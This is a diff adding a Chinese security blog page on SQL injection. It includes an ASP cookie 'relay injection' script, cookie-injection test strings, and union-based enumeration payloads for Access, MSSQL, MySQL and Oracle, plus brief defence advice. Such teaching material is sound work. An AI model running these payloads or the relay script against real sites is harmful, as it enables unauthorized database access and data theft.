@@ -1,0 +1,573 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    
+    
+    <title>SQL注入原理分析与绕过案例.md | WeiyiGeek Blog&#39;s</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="keywords" content="SQL注入">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.css">
+    <link rel="stylesheet" href="/css/style.css?v=1.4.4">
+    
+    <script type="text/javascript">
+        // Data Center
+        var DC = {
+            reward:	false,
+            lv: JSON.parse('{"enable":false,"app_id":null,"app_key":null,"icon":true}'),
+            v: JSON.parse('{"enable":false,"appid":null,"appkey":null,"notify":true,"verify":true,"placeholder":"give me some sugers plz...","avatar":"wavatar"}'),
+            g: JSON.parse('{"enable":false,"lazy":true,"owner":"codefine","repo":"gitment","oauth":{"client_id":null,"client_secret":null},"perPage":10}'),
+            d: JSON.parse('{"app_id":"6537ff7a"}')
+        };
+    </script>
+    <script type="text/javascript">
+        window.lazyScripts=[];
+    </script>
+    
+        <script type="text/javascript" src="/js/plugins/daovoice.js?v=1.4.4"></script>
+    
+</head>
+
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="">
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap">
+      
+      <img src="/img/brand.jpg" class="brand-bg">
+      
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.png">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">WeiyiGeek</h5>
+          <a href="mailto:master@weiyigeek.top" title="master@weiyigeek.top" class="mail">
+            
+              <span>m</span>
+            
+              <span>a</span>
+            
+              <span>s</span>
+            
+              <span>t</span>
+            
+              <span>e</span>
+            
+              <span>r</span>
+            
+              <span>@</span>
+            
+              <span>w</span>
+            
+              <span>e</span>
+            
+              <span>i</span>
+            
+              <span>y</span>
+            
+              <span>i</span>
+            
+              <span>g</span>
+            
+              <span>e</span>
+            
+              <span>e</span>
+            
+              <span>k</span>
+            
+              <span>.</span>
+            
+              <span>t</span>
+            
+              <span>o</span>
+            
+              <span>p</span>
+            
+          </a>
+        </hgroup>
+        
+        <ul class="menu-link">
+          
+              <li>
+                <a href="https://github.com/weiyigeek" target="_blank">
+                  <i class="icon icon-lg icon-github"></i>
+                </a>
+              </li>
+            
+              <li>
+                <a href="https://weibo.com/615643678" target="_blank">
+                  <i class="icon icon-lg icon-weibo"></i>
+                </a>
+              </li>
+            
+              <li>
+                <a href="https://t.me/WeiyiGeek" target="_blank">
+                  <i class="icon icon-lg icon-telegram"></i>
+                </a>
+              </li>
+            
+        </ul>
+        
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                首页
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                文章分类
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                文章标签
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                文章归档
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/books"  >
+                <i class="icon icon-lg icon-book"></i>
+                学习书籍
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-user"></i>
+                关于作者
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/links"  >
+                <i class="icon icon-lg icon-link"></i>
+                友情链接
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="https://github.com/weiyigeek" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="https://weibo.com/615643678" target="_blank" >
+                <i class="icon icon-lg icon-weibo"></i>
+                Weibo
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row clearfix">
+        <a href="javascript:;" class="header-icon pull-left waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">
+            <span>SQL注入原理分析与绕过案例.md</span>
+            
+        </div>
+        
+        <a href="javascript:;" id="site_search_btn" class="header-icon pull-right waves-effect waves-circle waves-light">
+            <i class="icon icon-lg icon-search"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+    <img src="/img/banner.jpg" class="header-bg">
+    <div class="container fade-scale">
+        <h1 class="title">SQL注入原理分析与绕过案例.md</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2019-03-31T05:36:30.000Z" itemprop="datePublished" class="page-time">
+  2019-03-31
+</time>
+
+
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/绕过技术/">绕过技术</a><ul class="article-category-list-child"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/绕过技术/黑防/">黑防</a></li></ul></li></ul>
+
+            
+        </h5>
+        
+    </div>
+    
+
+</header>
+
+<div id="site_search">
+    <div class="search-title clearfix">
+        <span class="pull-left">
+          <i class="icon icon-lg icon-search"></i>
+        </span>
+        <input type="text" id="local-search-input" name="q" results="0" placeholder="search my blog..." class="form-control pull-left"/>
+        <a href="javascript:;" class="close pull-right waves-effect waves-circle waves-light">
+          <i class="icon icon-lg icon-close"></i>
+        </a>
+    </div>
+    <div id="local-search-result"></div>
+</div>
+
+
+<div class="container body-wrap">
+    <article id="post-网安大类/OWASPTOP/SQLInject/SQL注入原理分析与绕过案例"
+  class="post-article article-type-post" itemprop="blogPost">
+    <div class="post-card">
+        <h1 class="post-card-title">SQL注入原理分析与绕过案例.md</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2019-03-31 13:36:30" datetime="2019-03-31T05:36:30.000Z"  itemprop="datePublished">2019-03-31</time>
+
+            
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/绕过技术/">绕过技术</a><ul class="article-category-list-child"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/绕过技术/黑防/">黑防</a></li></ul></li></ul>
+
+
+
+            
+
+            
+
+
+            
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            
+            <p><b style="color:red">注意：本文分享给安全从业人员,网站开发人员和运维人员在日常工作中使用和防范恶意攻击,请勿恶意使用下面描述技术进行非法操作。</b><br><a id="more"></a></p>
+<h4 id="0x00-数据库分类SQL注入原理分析"><a href="#0x00-数据库分类SQL注入原理分析" class="headerlink" title="0x00 数据库分类SQL注入原理分析"></a>0x00 数据库分类SQL注入原理分析</h4><h5 id="0-SQL测试语句"><a href="#0-SQL测试语句" class="headerlink" title="0.SQL测试语句"></a>0.SQL测试语句</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 检测语句</span><br><span class="line">and 1 = 1 # 不用说了,大家都明白</span><br><span class="line">xor 1 = 2 # 异或,此时正常返回数据</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 注入判断</span><br><span class="line">and exists(select * from [admin])  #判断admin表段是否存在</span><br><span class="line">and (select count(*) from [admin])</span><br></pre></td></tr></table></figure>
+<h5 id="1-ACCESS数据库"><a href="#1-ACCESS数据库" class="headerlink" title="1.ACCESS数据库"></a>1.ACCESS数据库</h5><p><strong>1) Cookie中转注入原理</strong><br>cookie注入的形成有两个必须条件：</p>
+<ul>
+<li>条件1是：程序对get和post方式提交的数据进行了过滤，但未对cookie提交的数据库进行过滤。</li>
+<li>条件2是：在条件1的基础上还需要程序对提交数据获取方式是直接request(“xxx”)的方式，未指明使用request对象的具体方法进行获取。</li>
+</ul>
+<p>做过ASP开发的大佬们都知道,Request.QueryString (GET) 或 Request.Form (POST) 用于读取用户发给WEB服务器的指定键中的值,但是有时候在开发时直接使用了Request()对象。<br>如：ID=Request(“ID”) , 如果未对cookie进行过滤这将会导致SQL风险;通过asp的Request对象使用文档知道 ASP WEB服务是怎样读取数据的,它是先取GET中的数据，没有再取POST中的数据,<em>还会去取Cookies中的数据</em>;</p>
+<p>一般的防注入系统,会检测GET和POST中的数据，如果有特殊字符(这里当然是注入字符了)!就禁止数据的提交, 但是由于他没有检测Cookies的数据！问题就来了~~~<br>比如：<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">SQL Cookies 中断注入点：http://weiyigeek.xxx/index.asp?ID=1024  <span class="comment">--#加载网页,显示正常</span></span><br><span class="line"></span><br><span class="line">http://weiyigeek.xxx/index.asp  <span class="comment">--#加载网页,显示不正常（没有输参数的原因)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--#下面我们以手动测试为例</span></span><br><span class="line">1.打开浏览器的js控制台</span><br><span class="line">&gt; document.cookie="ID=1024"     --#重新加载网页,显示正常</span><br><span class="line"></span><br><span class="line">2.进行SQL注入测试判断</span><br><span class="line">&gt; avascript:alert(document.cookie="id="+escape("123 and 3=3"));</span><br><span class="line">&gt; avascript:alert(document.cookie="id="+escape("123 and 3=4"));</span><br><span class="line">&gt; avascript:alert(document.cookie="id="+escape("123 order by n"));  --#拆解有几个字段数</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">3.可以采用中转注入工具进行注入中转。</span><br><span class="line">其实就是启动一个ASP解析服务器,然后生成一个本地的asp文件来转发get请求写入到COOKIE列表,然后提交给被攻击的网站中,即中转注入。</span><br><span class="line">&lt;%</span><br><span class="line">JmdcwName=request("jmdcw")</span><br><span class="line">JmdcwName=escape(JmdcwName)</span><br><span class="line">JmStr="Name=123&amp;ID="&amp;JmdcwName</span><br><span class="line">JMUrl="http://127.0.0.1/目录/注入页.asp"  '注入点</span><br><span class="line">JmRef="http://127.0.0.1/6kbbs/bank.asp"  '来源页</span><br><span class="line">JmCok="ASPSESSIONIDAQACTAQB=HKFHJOPDOMAIKGMPGBJJDKLJ;"</span><br><span class="line">JmCok=JmCok &amp; ";" &amp; Jmstr &amp;";"</span><br><span class="line">JmCok=URLEncoding(JmCok)</span><br><span class="line">JmStr="jmdcw=00"   '注入参数</span><br><span class="line">response.write    PostData(JMUrl,JmStr,JmCok,JmRef)</span><br><span class="line"></span><br><span class="line">Function PostData(PostUrl,PostStr,PostCok,PostRef)  </span><br><span class="line">Dim Http</span><br><span class="line"><span class="keyword">Set</span> <span class="keyword">Http</span> = Server.CreateObject(<span class="string">"msxml2.serverXMLHTTP"</span>)</span><br><span class="line"><span class="keyword">With</span> <span class="keyword">Http</span></span><br><span class="line"></span><br><span class="line">.Open <span class="string">"POST"</span>,PostUrl,<span class="literal">False</span></span><br><span class="line">.SetRequestHeader <span class="string">"Content-Length"</span>,<span class="keyword">Len</span>(PostStr)</span><br><span class="line">.SetRequestHeader <span class="string">"Content-Type"</span>,<span class="string">"application/x-www-form-urlencoded"</span></span><br><span class="line">.SetRequestHeader <span class="string">"Referer"</span>,PostRef</span><br><span class="line">.SetRequestHeader <span class="string">"Cookie"</span>,PostCok</span><br><span class="line">.Send PostStr</span><br><span class="line">PostData = .ResponseBody</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">With</span></span><br><span class="line"><span class="keyword">Set</span> <span class="keyword">Http</span> = <span class="keyword">Nothing</span></span><br><span class="line">PostData =bytes2BSTR(PostData)</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Function</span> bytes2BSTR(vIn)</span><br><span class="line">Dim strReturn</span><br><span class="line">Dim I, ThisCharCode, NextCharCode</span><br><span class="line">strReturn = <span class="string">""</span></span><br><span class="line"><span class="keyword">For</span> I = <span class="number">1</span> <span class="keyword">To</span> LenB(vIn)</span><br><span class="line">ThisCharCode = AscB(MidB(vIn, I, <span class="number">1</span>))</span><br><span class="line"><span class="keyword">If</span> ThisCharCode &lt; &amp;H80 <span class="keyword">Then</span></span><br><span class="line">strReturn = strReturn &amp; <span class="keyword">Chr</span>(ThisCharCode)</span><br><span class="line"><span class="keyword">Else</span></span><br><span class="line">NextCharCode = AscB(MidB(vIn, I + <span class="number">1</span>, <span class="number">1</span>))</span><br><span class="line">strReturn = strReturn &amp; <span class="keyword">Chr</span>(CLng(ThisCharCode) * &amp;H100 + CInt(NextCharCode))</span><br><span class="line">I = I + <span class="number">1</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"><span class="keyword">Next</span></span><br><span class="line">bytes2BSTR = strReturn</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Function</span> URLEncoding(vstrin)</span><br><span class="line">strReturn=<span class="string">""</span></span><br><span class="line">Dim i</span><br><span class="line"><span class="keyword">For</span> i=<span class="number">1</span> <span class="keyword">To</span> <span class="keyword">Len</span>(vstrin)</span><br><span class="line">ThisChr=<span class="keyword">Mid</span>(vstrin,i,<span class="number">1</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">Abs</span>(<span class="keyword">Asc</span>(ThisChr))&lt; &amp;HFF <span class="keyword">Then</span></span><br><span class="line">strReturn=strReturn &amp; ThisChr</span><br><span class="line"><span class="keyword">Else</span></span><br><span class="line">InnerCode=<span class="keyword">Asc</span>(ThisChr)</span><br><span class="line"><span class="keyword">If</span> InnerCode&lt;<span class="number">0</span> <span class="keyword">Then</span></span><br><span class="line">InnerCode=InnerCode + &amp;H10000</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">Hight1=(InnerCode <span class="keyword">And</span> &amp;HFF00) \&amp;HFF</span><br><span class="line">Low1=InnerCode <span class="keyword">And</span> &amp;HFF</span><br><span class="line">strReturn=strReturn &amp; <span class="string">"%"</span> &amp; <span class="keyword">Hex</span>(Hight1) &amp; <span class="string">"%"</span> &amp; <span class="keyword">Hex</span>(Low1)</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">if</span></span><br><span class="line"><span class="keyword">Next</span></span><br><span class="line">strReturn=<span class="keyword">Replace</span>(strReturn,<span class="keyword">chr</span>(<span class="number">32</span>),<span class="string">"%20"</span>) <span class="string">'转换空格,如果网站过滤了空格,尝试用/**/来代替%20</span></span><br><span class="line"><span class="string">strReturn=Replace(strReturn,chr(43),"%2B")    '</span>JMDCW增加转换+字符 <span class="string">'strReturn=Replace(strReturn,过滤字符,"转换为字符") 在此增加要过滤的代码</span></span><br><span class="line"><span class="string">URLEncoding=strReturn</span></span><br><span class="line"><span class="string">End Function</span></span><br><span class="line"><span class="string">%&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p><em>提示：</em> 如果程序员是用 Request.QueryString 或 Request.Form 获取数据的话，是无法利用Cookies绕过防注入系统进行注入的，因为服务程序是直截从GET或POST中读取数据的，Cookies是否有数据,WEB服务器是不理的,所以就无法利用了！~<br><em>防御：</em> 1.不要直接使用Request()对象 ; 2.非要使用必须进行Cookie数据进行验证。</p>
+<h5 id="2-mssql-数据库"><a href="#2-mssql-数据库" class="headerlink" title="2.mssql 数据库"></a>2.mssql 数据库</h5><p>MSSQL的SQL注入附录：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#枚举数据库：</span><br><span class="line">获取当前用户名 id=12 union select null, null, user, null from master..sysdatabases</span><br><span class="line">获取数据库列表 id=12 union select null, null, name,null from master..sysdatabases</span><br><span class="line">获取当前数据库名 id =12 union select null,null,db_name(),null from master..sysdatabases;</span><br><span class="line">获取表名： Id=12 union select null,null,name,null from sysobjects where xtype=&apos;u&apos;</span><br><span class="line">获取字段名： Id =12 union select null,null,col_name(object_id(&apos;table_name&apos;), 1), null from sysobjects</span><br></pre></td></tr></table></figure></p>
+<h5 id="3-mysql-数据库"><a href="#3-mysql-数据库" class="headerlink" title="3.mysql 数据库"></a>3.mysql 数据库</h5><p>MYSQL的SQL注入附录：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#系统信息</span><br><span class="line">union all select @@global.version_compile_os from mysql.user /*</span><br><span class="line"></span><br><span class="line">#数据库信息</span><br><span class="line">Select user() / version() / database()   #获取当前用户/版本/数据库 </span><br><span class="line">Select schema_name from information_schema.schemata #获取数据库列表</span><br><span class="line">Select table_name from information_schema.tables where table_schema=&apos;current_db&apos;   #获取表名</span><br><span class="line">SELECT COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&apos;tablename&apos;  #获取字段名</span><br><span class="line"></span><br><span class="line">and ord(mid(user(),1,1)) = 114 /*  #数据库权限判断,返回正常说明是Root</span><br></pre></td></tr></table></figure></p>
+<h5 id="4-oracle-数据库"><a href="#4-oracle-数据库" class="headerlink" title="4.oracle 数据库"></a>4.oracle 数据库</h5><p>ORACLE的SQL注入附录：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#Oracle只能访问一个数据库,无法枚举数据库</span><br><span class="line">获取当前用户表名：select table_name from user_tables</span><br><span class="line">获取所有表名及拥有者 select owner, table_name from all_tables</span><br><span class="line">获取字段名 select column_name from user_tab_columns where table_name=&apos;table&apos;</span><br></pre></td></tr></table></figure></p>
+<h4 id="0x01-SQL注入实例"><a href="#0x01-SQL注入实例" class="headerlink" title="0x01 SQL注入实例"></a>0x01 SQL注入实例</h4><h4 id="0x02-SQL绕过案例"><a href="#0x02-SQL绕过案例" class="headerlink" title="0x02 SQL绕过案例"></a>0x02 SQL绕过案例</h4><p>1) 常用绕过技巧列表<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. GET -&gt; POST 绕过 或者 POST -&gt; GET 请求</span><br><span class="line">2. Cookies 注入 或者 中转注入</span><br></pre></td></tr></table></figure></p>
+
+        </div>
+        
+<blockquote class="post-copyright">
+    <div class="content">
+        
+<span class="post-time">
+    最后更新时间：<time datetime="2019-09-23T01:10:45.507Z" itemprop="dateUpdated">2019-09-23 09:10:45</time>
+</span><br>
+
+
+        
+        转载注明出处，原文地址：<a href="/2019/3/sql注入原理分析与绕过案例-md.html" target="_blank" rel="external">http://weiyigeek.top/2019/3/sql注入原理分析与绕过案例-md.html</a>
+        
+    </div>
+    <footer>
+        <a href="http://weiyigeek.top">
+            <img src="/img/avatar.png" alt="WeiyiGeek">
+            WeiyiGeek
+        </a>
+    </footer>
+</blockquote>
+
+        
+        <div class="post-footer">
+            
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL注入/">SQL注入</a></li></ul>
+
+            <div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://weiyigeek.top/2019/3/sql注入原理分析与绕过案例-md.html&title=《SQL注入原理分析与绕过案例.md》 — WeiyiGeek Blog's&pic=http://weiyigeek.top/img/avatar.png" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://weiyigeek.top/2019/3/sql注入原理分析与绕过案例-md.html&title=《SQL注入原理分析与绕过案例.md》 — WeiyiGeek Blog's&source=注意：本文分享给安全从业人员,网站开发人员和运维人员在日常工作中使用和防范恶意攻击,请勿恶意使用下面描述技术进行非法操作。" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+        </div>
+        
+            
+
+
+        
+    </div>
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="prev">
+      <a href="/2019/3/操作系统学习代码编写实例-md.html" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">操作系统学习代码编写实例.md</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="next">
+      <a href="/2019/3/远程桌面漏洞利用与分析-md.html" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">远程桌面漏洞利用与分析.md</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+    
+    
+        <aside class="post-widget">
+            <nav class="post-toc-wrap" id="post-toc">
+                <strong>目录</strong>
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#0x00-数据库分类SQL注入原理分析"><span class="post-toc-number">1.</span> <span class="post-toc-text">0x00 数据库分类SQL注入原理分析</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#0x01-SQL注入实例"><span class="post-toc-number">2.</span> <span class="post-toc-text">0x01 SQL注入实例</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#0x02-SQL绕过案例"><span class="post-toc-number">3.</span> <span class="post-toc-text">0x02 SQL绕过案例</span></a></li></ol>
+            </nav>
+            <div class="toc-bar"><div>
+        </aside>
+    
+</article>
+
+
+</div>
+
+    </main>
+    <footer class="footer ">
+    
+    <div class="top">
+        
+            <p>
+    <span>Links：</span>
+    
+    <span class="blogroll-item">
+        <a href="https://blog.weiyigeek.top" target="_blank">https://blog.weiyigeek.top</a>
+    </span>
+    
+</p>
+
+        
+    </div>
+    
+    <div class="bottom">
+        <p>
+            <span>
+                WeiyiGeek &copy; 2018 - 2020
+            </span>
+        		
+           	
+            
+            
+            <span>
+	            Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/codefine/hexo-theme-mellow" target="_blank">mellow</a>
+            </span>
+            
+            
+            
+
+            
+                
+<span class="site-uv" title="总访客量">
+    <i class="icon icon-user"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
+</span>
+
+
+<span class="site-pv" title="总访问量">
+    <i class="icon icon-eye"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>
+</span>
+
+            
+        </p>
+      
+    </div>
+</footer>
+
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://weiyigeek.top/2019/3/sql注入原理分析与绕过案例-md.html&title=《SQL注入原理分析与绕过案例.md》 — WeiyiGeek Blog's&pic=http://weiyigeek.top/img/avatar.png" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://weiyigeek.top/2019/3/sql注入原理分析与绕过案例-md.html&title=《SQL注入原理分析与绕过案例.md》 — WeiyiGeek Blog's&source=注意：本文分享给安全从业人员,网站开发人员和运维人员在日常工作中使用和防范恶意攻击,请勿恶意使用下面描述技术进行非法操作。" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACtUlEQVR42u3aQXLjMAwEQP//09nrVmWtzABk1ofWKRWraLUOBDzg6xVfX9+u50/ze77f+f3+v//zunHh4eHhrR/93dLPnyaP9czOecXLwsPDw7vGe7ejJoCEkWOSV5M8Mx4eHt5n8pISkmzlm2KDh4eH9/m853vaoGFfJPDw8PD+Fy/fpvNmt13hOai9nrXg4eHhdfOmaIr0OX9fme/h4eHhrafqs5gg2ejbUHj4tHh4eHgXePmG+xzLbgLcUw332zvx8PDwLvA2A6okPtgfz8oHYMMwFw8PD2/Ea48L5Iu2RWWz5ipTwcPDwwt4s/Z31ijnJWT/KvHw8PB+h9cek2rj19nmvvoWPDw8vAu8WfzaFob9eKwtY3h4eHi/yWtb3lnkOgsm8jLzw+8GPDw8vDUv35pnG3TerG+OL0QpNR4eHt6al4cRZwddbet8LIbAw8PDW/OS7XUTJZwNi/PC88MYDA8PD+8CbzZ22oS8s3uiXwl4eHh4F3j5kH7WIuflJ4mJ28MHeHh4eDd4+QCsbZr3jLYArOZ7eHh4eAFv1tS27fWpULht4vHw8PDu8dqjUbODArPvesXXP9bHw8PDu8zLZ+5JPLEf/OdRclQY8PDw8I7y8m191lLXw/7ycFiRTOPh4eGtebNYth2D5Z/OCsMP8TEeHh7eNV679efRbV4YZoFIfaYMDw8P7yhv1s7OjmG1I7FhVIGHh4d3jTf74nyzbstAO/oqfjHg4eHhLXhf5ZW0zm3Jaf9frImHh4d3gXestiwCjvaYwuzAAR4eHt5Z3qYYtIHFpu1+XuHtynh4eHjXeMmXbcLfvC3eBxN4eHh4n8k7FfXODmYVrTYeHh7ex/CSprkNiBPS8NAVHh4e3gXePlDYtODta6pbajw8PLyjvLZRbmOI2Zj/1AEFPDw8vKO8P258+T4xllq0AAAAAElFTkSuQmCC" alt="微信分享二维码">
+</div>
+
+
+    <script type="text/javascript" src="/js/clicklove.js"></script>
+<script src="//code.tidio.co/mpu0bwolvjiokdywpzqyjgqfordnx7ee.js" async></script>
+    <!-- main-js -->
+<script type="text/javascript" src="//cdn.bootcss.com/jquery/2.1.0/jquery.min.js"></script>
+<script type="text/javascript" src="/js/plugins/fastclick.js?v=1.4.4"></script>
+<script type="text/javascript" src="/js/plugins/ios-orientationchange-fix.js?v=1.4.4"></script>
+<script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.js"></script>
+
+<script type="text/javascript" src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+
+<script type="text/javascript" src="/js/method.js?v=1.4.4"></script>
+<script type="text/javascript" src="/js/blog.js?v=1.4.4"></script>
+
+<!-- third-party -->
+
+
+
+
+
+
+<script type="text/javascript" src="/js/plugins/local_search.js?v=1.4.4"></script>
+<script type="text/javascript">
+	var search_path = "search.xml";
+	if (search_path.length === 0) {
+		search_path = "search.xml";
+	}
+	var path = "/" + search_path;
+	searchFunc(path, "local-search-input", "local-search-result");
+</script>
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+    
+    
+
+
+
+
+
+    <!-- mathjax config similar to math.stackexchange -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+            processEscapes: true,
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+
+
+
+    <script>
+    (function() {
+        var OriginTitile = document.title, titleTime;
+        document.addEventListener('visibilitychange', function() {
+            if (document.hidden) {
+                document.title = 'WeiyiGeek Blog's-关注于网络安全_物联网安全开发_网络运维-分享学习笔记与心得';
+                clearTimeout(titleTime);
+            } else {
+                document.title = '(つェ⊂)咦!又好了!';
+                titleTime = setTimeout(function() {
+                    document.title = OriginTitile;
+                },2000);
+            }
+        });
+    })();
+</script>
+
+
+
+
+    <script type="text/javascript">
+  daovoice('init', {
+    app_id: "6537ff7a"
+  });
+  daovoice('update');
+</script>
+
+
+    
+</body>
+</html>
